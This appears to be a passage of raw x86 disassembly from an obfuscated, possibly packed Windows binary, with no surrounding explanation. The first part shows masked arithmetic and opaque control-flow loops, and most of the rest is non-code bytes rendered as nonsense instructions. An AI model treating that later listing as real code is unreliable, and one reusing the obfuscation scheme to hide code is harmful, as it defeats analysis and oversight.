  41c6ab:	adc    DWORD PTR ds:0x429000,0x42b000
  41c6b5:	lea    ecx,[edx+ecx*1+0x5708fa]
  41c6bc:	mov    DWORD PTR [ebp-0x54],ecx
  41c6bf:	not    edx
  41c6c1:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6c4:	mov    edx,DWORD PTR ds:0x42901c
  41c6ca:	and    edx,DWORD PTR ds:0x42c004
  41c6d0:	mov    DWORD PTR ds:0x42901c,edx
  41c6d6:	mov    edx,DWORD PTR [ebp-0x50]
  41c6d9:	sbb    DWORD PTR ds:0x428010,0x6c9
  41c6e3:	lea    ecx,[edx+ecx*1+0x5708f9]
  41c6ea:	or     DWORD PTR ds:0x42c018,0x5b89
  41c6f4:	mov    DWORD PTR [ebp-0x50],ecx
  41c6f7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6fa:	xor    DWORD PTR ds:0x42c000,0x390a
  41c704:	xor    ecx,eax
  41c706:	sbb    DWORD PTR ds:0x428020,0x44b0
  41c710:	add    ecx,esi
  41c712:	jne    0x41c4ba
  41c718:	jmp    0x41ed36
  41c71d:	xor    edx,edx
  41c71f:	add    edx,DWORD PTR ds:0x42172a
  41c725:	mov    ecx,DWORD PTR ds:0x42350a
  41c72b:	sub    ecx,edx
  41c72d:	and    edx,DWORD PTR [edx+ecx*1]
  41c730:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c733:	sub    DWORD PTR ds:0x42b00c,0x42a008
  41c73d:	mov    edx,DWORD PTR [ebp-0x8]
  41c740:	xor    ecx,eax
  41c742:	or     DWORD PTR ds:0x42c014,0x2e7c
  41c74c:	xor    edx,eax
  41c74e:	sub    ecx,edx
  41c750:	sub    ecx,esi
  41c752:	xor    ecx,eax
  41c754:	mov    DWORD PTR [ebp-0x1c],ecx
  41c757:	mov    ecx,0x464b
  41c75c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c75f:	mov    DWORD PTR [ebp+0x8],ecx
  41c762:	jmp    0x41c827
  41c767:	and    DWORD PTR ds:0x42a008,0x0
  41c771:	jmp    0x41c783
  41c776:	mov    edi,DWORD PTR ds:0x42a008
  41c77c:	inc    edi
  41c77d:	mov    DWORD PTR ds:0x42a008,edi
  41c783:	cmp    DWORD PTR ds:0x42a008,0x11
  41c78a:	jae    0x41c7ee
  41c790:	cmp    DWORD PTR ds:0x42a008,0x6
  41c797:	jne    0x41c7b9
  41c79d:	push   DWORD PTR [ebp-0x14]
  41c7a0:	push   DWORD PTR [ebp-0x18]
  41c7a3:	push   DWORD PTR [ebp-0x10]
  41c7a6:	push   DWORD PTR [ebp-0x10]
  41c7a9:	push   0x7583
  41c7ae:	push   0x42b000
  41c7b3:	call   DWORD PTR ds:0x424038
  41c7b9:	cmp    DWORD PTR ds:0x42a008,0x5
  41c7c0:	jne    0x41c7d5
  41c7c6:	xor    edi,edi
  41c7c8:	or     edi,DWORD PTR ds:0x42a008
  41c7ce:	inc    edi
  41c7cf:	mov    DWORD PTR ds:0x42a008,edi
  41c7d5:	jmp    0x41c776
  41c7da:	xor    ecx,ecx
  41c7dc:	add    ecx,DWORD PTR ds:0x42b000
  41c7e2:	adc    ecx,DWORD PTR ds:0x42b008
  41c7e8:	mov    DWORD PTR ds:0x42b000,ecx
  41c7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7f1:	mov    edx,DWORD PTR ds:0x42c018
  41c7f7:	sbb    DWORD PTR ds:0x42a01c,edx
  41c7fd:	mov    edx,DWORD PTR [ebp-0x8]
  41c800:	xor    ecx,eax
  41c802:	xor    edx,eax
  41c804:	sub    ecx,edx
  41c806:	sub    ecx,esi
  41c808:	xor    ecx,eax
  41c80a:	mov    DWORD PTR [ebp+0x8],ecx
  41c80d:	mov    ecx,DWORD PTR [ebp+0x8]
  41c810:	mov    edx,DWORD PTR [ebp+0x8]
  41c813:	imul   edx,edx,0x5708f5
  41c819:	xor    ecx,eax
  41c81b:	add    ecx,esi
  41c81d:	lea    ecx,[ebp+ecx*4-0x64]
  41c821:	mov    edi,DWORD PTR [ecx]
  41c823:	add    edx,edi
  41c825:	mov    DWORD PTR [ecx],edx
  41c827:	mov    ecx,DWORD PTR [ebp+0x8]
  41c82a:	xor    ecx,eax
  41c82c:	add    ecx,esi
  41c82e:	jne    0x41c767
  41c834:	mov    ecx,DWORD PTR [ebp-0x20]
  41c837:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c83e:	mov    dl,BYTE PTR [ebp-0x1]
  41c841:	cmp    cl,dl
  41c843:	je     0x41c91c
  41c849:	mov    ecx,DWORD PTR [ebp-0x20]
  41c84c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c853:	mov    edx,DWORD PTR [ebp+0xc]
  41c856:	cmp    cl,BYTE PTR [edx]
  41c858:	jne    0x41ed48
  41c85e:	mov    ecx,DWORD PTR [ebp-0x14]
  41c861:	mov    edx,DWORD PTR [ebp+0xc]
  41c864:	movsx  edx,BYTE PTR [edx]
  41c867:	xor    ecx,eax
  41c869:	add    ecx,esi
  41c86b:	cmp    edx,ecx
  41c86d:	mov    ecx,DWORD PTR [ebp-0xc]
  41c870:	mov    DWORD PTR [ebp+0x8],ecx
  41c873:	mov    ecx,DWORD PTR [ebp+0x8]
  41c876:	je     0x42113d
  41c87c:	jmp    0x41c8b1
  41c881:	mov    ecx,DWORD PTR [ebp+0x8]
  41c884:	mov    edx,DWORD PTR [ebp-0x8]
  41c887:	xor    ecx,eax
  41c889:	xor    edx,eax
  41c88b:	sub    ecx,edx
  41c88d:	sub    ecx,esi
  41c88f:	xor    ecx,eax
  41c891:	mov    DWORD PTR [ebp+0x8],ecx
  41c894:	mov    ecx,DWORD PTR [ebp+0x8]
  41c897:	mov    edx,DWORD PTR [ebp+0x8]
  41c89a:	xor    ecx,eax
  41c89c:	imul   edx,edx,0x5708f5
  41c8a2:	add    ecx,esi
  41c8a4:	lea    ecx,[ebp+ecx*4-0x64]
  41c8a8:	mov    edi,DWORD PTR [ecx]
  41c8aa:	add    edx,edi
  41c8ac:	mov    DWORD PTR [ecx],edx
  41c8ae:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8b1:	xor    ecx,eax
  41c8b3:	add    ecx,esi
  41c8b5:	jne    0x41c881
  41c8bb:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8be:	mov    edx,DWORD PTR [ebp+0x8]
  41c8c1:	xor    ecx,eax
  41c8c3:	xor    edx,eax
  41c8c5:	add    ecx,esi
  41c8c7:	add    edx,esi
  41c8c9:	cmp    ecx,edx
  41c8cb:	jae    0x41c961
  41c8d1:	lea    edx,[ecx-0x3272db]
  41c8d7:	mov    DWORD PTR [ebp-0x18],edx
  41c8da:	mov    edi,DWORD PTR [ebp-0x18]
  41c8dd:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41c8e4:	lea    edx,[ebp-0x24]
  41c8e7:	mov    DWORD PTR [ebp-0x10],edx
  41c8ea:	mov    edx,DWORD PTR [ebp-0x10]
  41c8ed:	add    DWORD PTR [edx],0x705fa08
  41c8f3:	mov    ebx,DWORD PTR [ebp-0x10]
  41c8f6:	xor    edi,eax
  41c8f8:	add    edi,DWORD PTR [ebx]
  41c8fa:	lea    edx,[ebp+ecx*4-0x64]
  41c8fe:	mov    ebx,DWORD PTR [edx]
  41c900:	xor    edi,ebx
  41c902:	mov    DWORD PTR [edx],edi
  41c904:	mov    edx,DWORD PTR [ebp+0x8]
  41c907:	xor    edx,eax
  41c909:	inc    ecx
  41c90a:	inc    DWORD PTR [ebp-0x18]
  41c90d:	add    edx,esi
  41c90f:	cmp    ecx,edx
  41c911:	jb     0x41c8da
  41c917:	jmp    0x41c961
  41c91c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c91f:	mov    DWORD PTR [ebp+0x8],ecx
  41c922:	jmp    0x41c954
  41c927:	mov    ecx,DWORD PTR [ebp+0x8]
  41c92a:	mov    edx,DWORD PTR [ebp-0x8]
  41c92d:	xor    ecx,eax
  41c92f:	xor    edx,eax
  41c931:	sub    ecx,edx
  41c933:	sub    ecx,esi
  41c935:	xor    ecx,eax
  41c937:	mov    DWORD PTR [ebp+0x8],ecx
  41c93a:	mov    ecx,DWORD PTR [ebp+0x8]
  41c93d:	mov    edx,DWORD PTR [ebp+0x8]
  41c940:	imul   edx,edx,0x5708f5
  41c946:	xor    ecx,eax
  41c948:	add    ecx,esi
  41c94a:	lea    ecx,[ebp+ecx*4-0x64]
  41c94e:	mov    edi,DWORD PTR [ecx]
  41c950:	add    edx,edi
  41c952:	mov    DWORD PTR [ecx],edx
  41c954:	mov    ecx,DWORD PTR [ebp+0x8]
  41c957:	xor    ecx,eax
  41c959:	add    ecx,esi
  41c95b:	jne    0x41c927
  41c961:	mov    ecx,DWORD PTR [ebp-0xc]
  41c964:	mov    DWORD PTR [ebp+0x8],ecx
  41c967:	jmp    0x41ed14
  41c96c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c96f:	mov    edx,DWORD PTR [ebp-0x8]
  41c972:	xor    ecx,eax
  41c974:	xor    edx,eax
  41c976:	sub    ecx,edx
  41c978:	jmp    0x41ecf3
  41c97d:	rcr    DWORD PTR [esi+0x158d36fd],1
  41c983:	imul   esp,DWORD PTR [ebp-0x6e],0x3380d858
  41c98a:	dec    ecx
  41c98b:	test   BYTE PTR [edx+0x6261fde1],bh
  41c991:	add    al,0x5f
  41c993:	bound  esp,QWORD PTR [edx+0x2e]
  41c996:	ja     0x41c91e
  41c998:	push   0xe
  41c99a:	sbb    ebp,DWORD PTR ds:0xf90696c0
  41c9a0:	nop
  41c9a1:	push   eax
  41c9a2:	pop    ebx
  41c9a3:	pop    es
  41c9a4:	cs pop esp
  41c9a6:	push   esp
  41c9a7:	push   esi
  41c9a8:	sub    edx,DWORD PTR [edx+0x69cadb4f]
  41c9ae:	fs and eax,0xbc0e3d2c
  41c9b4:	aaa    
  41c9b5:	jns    0x41ca19
  41c9b7:	add    DWORD PTR [edx+ecx*4+0x749f56c8],esp
  41c9be:	mov    edi,0xcefb9936
  41c9c3:	rol    ecx,cl
  41c9c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9c6:	sub    esp,esi
  41c9c8:	loopne 0x41c96c
  41c9ca:	inc    ebp
  41c9cb:	pop    edi
  41c9cc:	pop    edx
  41c9cd:	imul   ecx,esp,0xc12bb3a
  41c9d3:	inc    esp
  41c9d4:	jmp    0xd564:0xbff215e4
  41c9db:	sbb    eax,eax
  41c9dd:	mov    eax,0x7a1fd684
  41c9e2:	(bad)  
  41c9e3:	in     eax,0xbc
  41c9e5:	scas   eax,DWORD PTR es:[edi]
  41c9e6:	sbb    eax,0xe914255a
  41c9eb:	dec    ebx
  41c9ec:	cs xor al,0x82
  41c9ef:	add    eax,0x88db05f7
  41c9f4:	imul   BYTE PTR [edi-0x2a4e6696]
  41c9fa:	push   ebp
  41c9fb:	out    0x29,al
  41c9fd:	mov    WORD PTR [eax],es
  41c9ff:	jecxz  0x41ca61
  41ca01:	and    BYTE PTR [ecx-0x44],dl
  41ca04:	dec    ebx
  41ca05:	sbb    al,0xb4
  41ca07:	dec    eax
  41ca08:	fdiv   st(6),st
  41ca0a:	mov    bh,0x62
  41ca0c:	push   edx
  41ca0d:	lock loopne 0x41ca57
  41ca10:	(bad)  
  41ca11:	(bad)  
  41ca13:	leave  
  41ca14:	jb     0x41ca2d
  41ca16:	outs   dx,BYTE PTR ds:[esi]
  41ca17:	jns    0x41c99a
  41ca19:	mov    ebx,0xedce66d4
  41ca1e:	data16 jbe 0x41ca5b
  41ca21:	aaa    
  41ca22:	mul    BYTE PTR [ebx]
  41ca24:	iret   
  41ca25:	mov    al,gs:0x185e8d6b
  41ca2b:	add    al,0x37
  41ca2d:	cwde   
  41ca2e:	adc    eax,0xc0c621bc
  41ca33:	(bad)  
  41ca34:	xor    al,0x87
  41ca36:	out    dx,al
  41ca37:	sbb    al,0x58
  41ca39:	or     DWORD PTR [edx-0x29],edi
  41ca3c:	and    ebp,DWORD PTR [ecx-0x3d]
  41ca3f:	(bad)  [esi+0x248205a2]
  41ca45:	mov    al,0x52
  41ca47:	adc    ch,BYTE PTR [ebx-0x60]
  41ca4a:	fwait
  41ca4b:	repnz xchg ecx,eax
  41ca4d:	dec    edx
  41ca4e:	lea    eax,[ebp*1-0x240dc530]
  41ca55:	or     BYTE PTR [esi],dh
  41ca57:	lds    ecx,FWORD PTR [edi-0xae9a587]
  41ca5d:	pushf  
  41ca5e:	and    ecx,DWORD PTR [edi+0x75]
  41ca61:	sbb    DWORD PTR [edi+eax*4-0xa1e3c83],eax
  41ca68:	sbb    al,BYTE PTR ds:[ecx-0x1d]
  41ca6c:	sbb    DWORD PTR [ecx+0x40],0x1
  41ca70:	in     al,0x85
  41ca72:	lahf   
  41ca73:	test   eax,0x134ce552
  41ca78:	retf   
  41ca79:	retf   0x4353
  41ca7c:	in     eax,0xc1
  41ca7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca7f:	repnz dec ebx
  41ca81:	nop
  41ca82:	xchg   esi,eax
  41ca83:	mov    esp,0x857791c0
  41ca88:	push   0x17
  41ca8a:	cdq    
  41ca8b:	call   0x97b7487b
  41ca90:	pop    esp
  41ca91:	push   0x768e3c6
  41ca96:	mov    al,ds:0xe1f72024
  41ca9b:	sub    eax,0xac5dcb6
  41caa0:	mov    eax,DWORD PTR [eax+0x478050bd]
  41caa6:	in     al,dx
  41caa7:	sar    DWORD PTR [eax+0x2be54613],0x8c
  41caae:	fnstcw WORD PTR [edi-0x667c328a]
  41cab4:	jl     0x41caa6
  41cab6:	sbb    dl,BYTE PTR [edi+0x20]
  41cab9:	lods   al,BYTE PTR ds:[esi]
  41caba:	outs   dx,BYTE PTR ds:[esi]
  41cabb:	(bad)  
  41cabc:	sub    dl,BYTE PTR [edx]
  41cabe:	std    
  41cabf:	sub    cl,BYTE PTR [ebx-0x71]
  41cac2:	and    BYTE PTR [ebx+0x165f2046],0xac
  41cac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caca:	test   eax,0x8468dd7c
  41cacf:	adc    esi,ebp
  41cad1:	and    ah,dh
  41cad3:	cmp    ecx,ecx
  41cad5:	mov    ds:0x78cd628b,al
  41cada:	jg     0x41caad
  41cadc:	por    mm2,QWORD PTR [eax+0x1]
  41cae0:	ret    
  41cae1:	cmp    ch,0x7a
  41cae4:	retf   0xfaf1
  41cae7:	or     DWORD PTR ds:0xbd23d4c8,esp
  41caed:	test   BYTE PTR [esi],al
  41caef:	push   ebx
  41caf0:	push   ebx
  41caf1:	mul    DWORD PTR [eax+0x43]
  41caf4:	xor    bh,BYTE PTR [ecx]
  41caf6:	les    esp,FWORD PTR [edi+edi*2]
  41caf9:	and    eax,0xcae68763
  41cafe:	ror    ecx,cl
  41cb00:	int3   
  41cb01:	mov    bl,cl
  41cb03:	retf   0x3c9a
  41cb06:	mov    esi,0x9d87088e
  41cb0b:	mov    al,0x2c
  41cb0d:	mov    eax,0xd4ef25d
  41cb12:	xor    al,0xd4
  41cb14:	stos   BYTE PTR es:[edi],al
  41cb15:	out    dx,eax
  41cb16:	inc    ecx
  41cb17:	int3   
  41cb18:	dec    edx
  41cb19:	stos   DWORD PTR es:[edi],eax
  41cb1a:	ret    0x97e9
  41cb1d:	push   0xffffffcc
  41cb1f:	xchg   ebp,eax
  41cb20:	dec    edi
  41cb21:	jge    0x41cb3e
  41cb23:	jnp    0x41cb40
  41cb25:	rol    DWORD PTR [edx],cl
  41cb27:	adc    ah,BYTE PTR [ebx]
  41cb29:	fwait
  41cb2a:	add    eax,0x7d127732
  41cb2f:	xor    BYTE PTR [esi-0x546ba998],ch
  41cb35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb36:	pop    ebp
  41cb37:	ins    BYTE PTR es:[edi],dx
  41cb38:	jp     0x41cb85
  41cb3a:	jle    0x41cb68
  41cb3c:	mov    dl,0xc4
  41cb3e:	sbb    bh,ch
  41cb40:	ror    BYTE PTR [edi+0x68670465],cl
  41cb46:	fist   DWORD PTR [edi-0x43d560f1]
  41cb4c:	sub    al,0xf8
  41cb4e:	mov    esp,0xdc4bf895
  41cb53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb54:	rol    DWORD PTR [ecx+0x509ad5c],0x93
  41cb5b:	arpl   WORD PTR [ebp-0xd],bx
  41cb5e:	add    eax,DWORD PTR [esp+eiz*4+0xaf4db4]
  41cb65:	shl    DWORD PTR [edi-0x2],1
  41cb68:	jno    0x41cb3a
  41cb6a:	add    esi,ebp
  41cb6c:	loopne 0x41cbb3
  41cb6e:	cmp    ebx,DWORD PTR [edi-0x7d]
  41cb71:	fadd   QWORD PTR [edx]
  41cb73:	repnz and al,bh
  41cb76:	mov    dh,BYTE PTR [edi]
  41cb78:	icebp  
  41cb79:	mov    dh,0x1
  41cb7c:	ss ds adc al,0x99
  41cb80:	add    eax,0x8efe4f03
  41cb85:	fisub  WORD PTR [ebp+0x687c3b39]
  41cb8b:	add    dh,BYTE PTR [eax-0xdd27598]
  41cb91:	mov    ebx,0x330f89d9
  41cb96:	pushf  
  41cb97:	mov    bh,0x9f
  41cb99:	push   cs
  41cb9a:	xor    cl,BYTE PTR [ecx-0x68]
  41cb9d:	pop    esp
  41cb9e:	outs   dx,DWORD PTR ds:[esi]
  41cb9f:	fld    DWORD PTR [esi+0x4f]
  41cba2:	imul   ebp,DWORD PTR [ecx-0x5f],0x78
  41cba6:	sbb    ebx,ecx
  41cba8:	ds dec edx
  41cbaa:	mov    esp,0xf83fad87
  41cbaf:	mov    al,0x2b
  41cbb1:	adc    al,0x45
  41cbb3:	int    0x2b
  41cbb5:	sbb    al,0x42
  41cbb7:	mov    ebp,0x56c229bb
  41cbbc:	dec    eax
  41cbbd:	sbb    eax,0xe0c382f8
  41cbc2:	inc    ebp
  41cbc3:	adc    eax,0xbbd23174
  41cbc8:	push   cs
  41cbc9:	xchg   esi,eax
  41cbca:	xor    BYTE PTR [ecx-0x9],dh
  41cbcd:	subps  xmm6,XMMWORD PTR [esi-0x13d7cd59]
  41cbd4:	iret   
  41cbd5:	in     eax,dx
  41cbd6:	push   ebp
  41cbd7:	adc    eax,DWORD PTR [eax]
  41cbd9:	lds    ebp,FWORD PTR [ecx-0x4689a952]
  41cbdf:	out    0xe5,eax
  41cbe1:	fwait
  41cbe2:	sbb    DWORD PTR [ebp+0x62],esp
  41cbe5:	fcom   QWORD PTR [edi]
  41cbe7:	jo     0x41cbb6
  41cbe9:	ins    BYTE PTR es:[edi],dx
  41cbea:	push   ds
  41cbeb:	mov    ecx,0xea4b3f59
  41cbf0:	rol    DWORD PTR [eax],cl
  41cbf2:	fbld   TBYTE PTR [edx]
  41cbf4:	inc    ebx
  41cbf5:	dec    esi
  41cbf6:	mov    bl,0x82
  41cbf8:	sub    edx,ecx
  41cbfa:	rcr    BYTE PTR [esi+ebp*8+0x2ce7fb40],1
  41cc01:	cld    
  41cc02:	xchg   ebp,eax
  41cc03:	repz pushf 
  41cc05:	push   0xffffff8e
  41cc07:	lods   al,BYTE PTR ds:[esi]
  41cc08:	dec    esi
  41cc09:	jecxz  0x41cbb9
  41cc0b:	cmp    eax,eax
  41cc0d:	sub    BYTE PTR [edx],al
  41cc0f:	(bad)  [edx+eiz*8+0x292e517b]
  41cc16:	mov    bh,0xa1
  41cc18:	cdq    
  41cc19:	jg     0x41cc91
  41cc1b:	stos   DWORD PTR es:[edi],eax
  41cc1c:	shl    esi,1
  41cc1e:	cmc    
  41cc1f:	sar    BYTE PTR [esi+edi*2+0x23c9200a],cl
  41cc26:	dec    ebx
  41cc27:	inc    edi
  41cc28:	push   esi
  41cc29:	gs pop edx
  41cc2b:	stc    
  41cc2c:	mov    esi,0xc1ab3f0b
  41cc31:	xchg   BYTE PTR [ebx],dh
  41cc33:	pushf  
  41cc34:	dec    ebx
  41cc35:	push   ebx
  41cc36:	(bad)  
  41cc37:	icebp  
  41cc38:	je     0x41cc04
  41cc3a:	jge    0x41cc28
  41cc3c:	push   edx
  41cc3d:	enter  0xb2db,0xeb
  41cc41:	icebp  
  41cc42:	ficomp DWORD PTR [ecx+eax*8-0x78a22087]
  41cc49:	clc    
  41cc4a:	jmp    0x6719429c
  41cc4f:	loopne 0x41cc1e
  41cc51:	sar    DWORD PTR [esi-0x57a00b60],1
  41cc57:	cld    
  41cc58:	xor    al,0xa6
  41cc5a:	dec    esp
  41cc5b:	addr16 mov esp,0x8d2a6025
  41cc61:	iret   
  41cc62:	xor    eax,0x4b6d464
  41cc67:	aam    0x45
  41cc69:	pop    ecx
  41cc6a:	sub    eax,0x6daa0a30
  41cc6f:	mov    dh,0xdc
  41cc71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc72:	xor    DWORD PTR [eax+0x32],0xffffffd7
  41cc76:	enter  0x9f11,0x45
  41cc7a:	das    
  41cc7b:	sub    esi,DWORD PTR [ebx+0x4d2fb5fe]
  41cc81:	pop    esp
  41cc82:	push   ecx
  41cc83:	ficomp WORD PTR [edx+0x2]
  41cc86:	arpl   WORD PTR [edi-0x1e6a5028],bx
  41cc8c:	test   DWORD PTR [edi+0x486f8cb4],0x65a9b829
  41cc96:	loopne 0x41ccf4
  41cc98:	scas   al,BYTE PTR es:[edi]
  41cc99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc9a:	sti    
  41cc9b:	adc    dl,BYTE PTR [eax+eax*1+0x34]
  41cc9f:	mov    ch,0xf6
  41cca1:	adc    ebx,ebp
  41cca3:	rol    dl,1
  41cca5:	bound  edx,QWORD PTR [eax-0x71]
  41cca8:	dec    edx
  41cca9:	clc    
  41ccaa:	pop    esp
  41ccab:	inc    edi
  41ccac:	push   edx
  41ccad:	es push ss
  41ccaf:	mov    dl,0x8c
  41ccb1:	aaa    
  41ccb2:	clc    
  41ccb3:	shl    DWORD PTR [edx-0x12fe36a],0xe3
  41ccba:	ret    0x10fe
  41ccbd:	adc    ecx,0xffffffaf
  41ccc0:	mov    gs,WORD PTR [esi-0x7]
  41ccc3:	jnp    0x41cc99
  41ccc5:	outs   dx,BYTE PTR ds:[esi]
  41ccc6:	sar    BYTE PTR [ecx+0x250dd032],0x83
  41cccd:	ror    BYTE PTR [esi],0xec
  41ccd0:	xlat   BYTE PTR ds:[ebx]
  41ccd1:	dec    ebp
  41ccd2:	fld    TBYTE PTR es:[esi]
  41ccd5:	add    ebx,edx
  41ccd7:	mov    cl,0x9e
  41ccd9:	or     al,BYTE PTR ss:[esi+0x39]
  41ccdd:	sbb    eax,0xf509d91c
  41cce2:	fcomp  QWORD PTR [edi]
  41cce4:	sahf   
  41cce5:	pop    ecx
  41cce6:	pop    ebp
  41cce7:	or     al,ah
  41cce9:	pop    edx
  41ccea:	sbb    edx,DWORD PTR [esp+eax*2]
  41cced:	je     0x41cd60
  41ccef:	sub    al,0x23
  41ccf1:	jp     0x41cccb
  41ccf3:	jmp    0x7318b6a0
  41ccf8:	xlat   BYTE PTR ds:[ebx]
  41ccf9:	icebp  
  41ccfa:	mov    ch,0x72
  41ccfc:	mov    ah,0xa2
  41ccfe:	sbb    DWORD PTR [edx+0x1f08672e],esp
  41cd04:	ret    0x53a3
  41cd07:	icebp  
  41cd08:	rol    bl,cl
  41cd0a:	fwait
  41cd0b:	jmp    0x70c3:0x6ed3a12f
  41cd12:	cmp    BYTE PTR [ebp-0x3835a75c],cl
  41cd18:	daa    
  41cd19:	lea    edi,[ebx+0x33787b8d]
  41cd1f:	and    DWORD PTR [edx],eax
  41cd21:	xchg   edi,eax
  41cd22:	dec    edi
  41cd23:	or     al,0x14
  41cd25:	mov    cl,0x9b
  41cd27:	jmp    0x41cd1e
  41cd29:	and    eax,DWORD PTR [edx-0x74]
  41cd2c:	adc    ah,ch
  41cd2e:	leave  
  41cd2f:	popa   
  41cd30:	not    BYTE PTR [eax]
  41cd32:	cld    
  41cd33:	push   0x10
  41cd35:	fdiv   DWORD PTR cs:[edi+0x5f]
  41cd39:	or     DWORD PTR [esi+0x365e0594],ecx
  41cd3f:	fidiv  WORD PTR [edx+0x61]
  41cd42:	aaa    
  41cd43:	or     BYTE PTR [ecx],ah
  41cd45:	xchg   edi,eax
  41cd46:	fild   DWORD PTR [edx+0x22]
  41cd49:	lods   eax,DWORD PTR ds:[esi]
  41cd4a:	pop    ds
  41cd4b:	pop    edi
  41cd4c:	add    BYTE PTR [eax-0x6291fb51],cl
  41cd52:	cmp    al,cl
  41cd54:	add    al,0x41
  41cd56:	lea    ecx,[esi]
  41cd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd59:	xchg   esp,eax
  41cd5a:	mov    ebp,0x1d10c673
  41cd5f:	xchg   ebx,eax
  41cd60:	xchg   edi,eax
  41cd61:	add    edi,0xffffffe1
  41cd64:	fist   WORD PTR [ecx-0x73420655]
  41cd6a:	cdq    
  41cd6b:	fnsave [esi+0x3165737e]
  41cd71:	push   DWORD PTR [ebp+0x2453a50d]
  41cd77:	jmp    0x41cd23
  41cd79:	out    dx,eax
  41cd7a:	pop    ecx
  41cd7b:	fwait
  41cd7c:	inc    ebp
  41cd7d:	mov    edi,0x4f4a38d9
  41cd82:	mov    ds:0xf7d4f1da,al
  41cd87:	cmp    cl,cl
  41cd89:	mov    cl,0x82
  41cd8b:	std    
  41cd8c:	jl     0x41cd6f
  41cd8e:	pop    edi
  41cd8f:	arpl   WORD PTR [ebx+0x4dafe0dd],bp
  41cd95:	jmp    0x920758f3
  41cd9a:	neg    DWORD PTR [ebp+0x7]
  41cd9d:	mov    ch,0x3d
  41cd9f:	test   BYTE PTR [eax-0x4c3130b8],dh
  41cda5:	sub    edi,esi
  41cda7:	aam    0xfe
  41cda9:	push   cs
  41cdaa:	orps   xmm2,XMMWORD PTR [esp+edx*2]
  41cdae:	push   0x49
  41cdb0:	fldcw  WORD PTR [ecx]
  41cdb2:	das    
  41cdb3:	mov    ds:0x291efda,eax
  41cdb8:	dec    ebx
  41cdb9:	mov    ds:0xb0b71ea4,eax
  41cdbe:	add    BYTE PTR [ebx+0x1cecd53c],bl
  41cdc4:	push   0x7f
  41cdc6:	(bad)  
  41cdc7:	sub    al,0x19
  41cdc9:	shl    DWORD PTR [ecx-0x6f],cl
  41cdcc:	mov    gs,ebp
  41cdce:	mov    BYTE PTR [ebp-0x10],dl
  41cdd1:	mov    al,0x37
  41cdd3:	add    BYTE PTR [edx+0x74630eed],0xcd
  41cdda:	xor    eax,0x79daf087
  41cddf:	mov    dl,BYTE PTR [edi]
  41cde1:	xchg   edi,eax
  41cde2:	push   ebp
  41cde3:	frstor [esi]
  41cde5:	inc    edi
  41cde6:	mov    esp,DWORD PTR [ecx+ecx*1]
  41cde9:	sahf   
  41cdea:	dec    eax
  41cdeb:	ja     0x41ce2d
  41cded:	call   0x5675:0x291e705
  41cdf4:	mov    eax,0xcfb79911
  41cdf9:	fnstenv [eax-0x4]
  41cdfc:	jno    0x41ce0d
  41cdfe:	fnstsw WORD PTR [esi-0x3d]
  41ce01:	xchg   BYTE PTR [edi+0x3bf28b29],cl
  41ce07:	lds    esi,FWORD PTR [eax]
  41ce09:	dec    esp
  41ce0a:	sub    WORD PTR [esi+0x6e89c663],bp
  41ce11:	lds    edx,FWORD PTR [ebp-0x32b176a9]
  41ce17:	test   BYTE PTR [esi+0x2946ed6e],bl
  41ce1d:	push   ebx
  41ce1e:	inc    edi
  41ce1f:	cmp    ax,0xafcd
  41ce23:	sub    al,0xac
  41ce25:	retf   
  41ce26:	loopne 0x41ce86
  41ce28:	pop    ebp
  41ce29:	add    BYTE PTR [ecx+0x55],0xdc
  41ce2d:	inc    ecx
  41ce2e:	xor    BYTE PTR [ecx+0x7b],bh
  41ce31:	or     eax,0x98453d87
  41ce37:	sti    
  41ce38:	adc    ebx,DWORD PTR [eax+0x6f]
  41ce3b:	or     BYTE PTR ds:[edi-0x7e175de5],bh
  41ce42:	(bad)  
  41ce43:	test   al,0xe8
  41ce45:	dec    eax
  41ce46:	ret    
  41ce47:	mov    bh,0x51
  41ce49:	je     0x41ce74
  41ce4b:	mov    edi,0xcb18aa5d
  41ce50:	fld    QWORD PTR [esi+0x30]
  41ce53:	cli    
  41ce54:	imul   edx,DWORD PTR [ecx+0x542ccc30],0x1
  41ce5b:	ins    DWORD PTR es:[edi],dx
  41ce5c:	aam    0xda
  41ce5e:	outs   dx,DWORD PTR ds:[esi]
  41ce5f:	jno    0x41cdea
  41ce61:	adc    eax,ebx
  41ce63:	pop    ds
  41ce64:	inc    ecx
  41ce65:	cs ins DWORD PTR es:[edi],dx
  41ce67:	push   esi
  41ce68:	repz push 0x134dfe0b
  41ce6e:	mov    ds:0x7651b207,eax
  41ce73:	ret    
  41ce74:	pop    ecx
  41ce75:	add    eax,0x540c394
  41ce7a:	cmp    al,0xbe
  41ce7c:	icebp  
  41ce7d:	ret    
  41ce7e:	lods   eax,DWORD PTR ds:[esi]
  41ce7f:	mov    WORD PTR [ebx],?
  41ce81:	loop   0x41ce88
  41ce83:	stos   BYTE PTR es:[edi],al
  41ce84:	cmp    ebx,DWORD PTR [ebp+0x75]
  41ce87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce88:	sbb    al,0xbc
  41ce8a:	push   ecx
  41ce8b:	(bad)  
  41ce8c:	fisub  WORD PTR [edi+0x68]
  41ce8f:	outs   dx,BYTE PTR ds:[esi]
  41ce90:	fwait
  41ce91:	pop    edi
  41ce92:	mov    ah,0x3c
  41ce94:	and    esi,DWORD PTR [ebx]
  41ce96:	adc    DWORD PTR [ebp+ebp*8+0x57],esi
  41ce9a:	mov    bl,0x9c
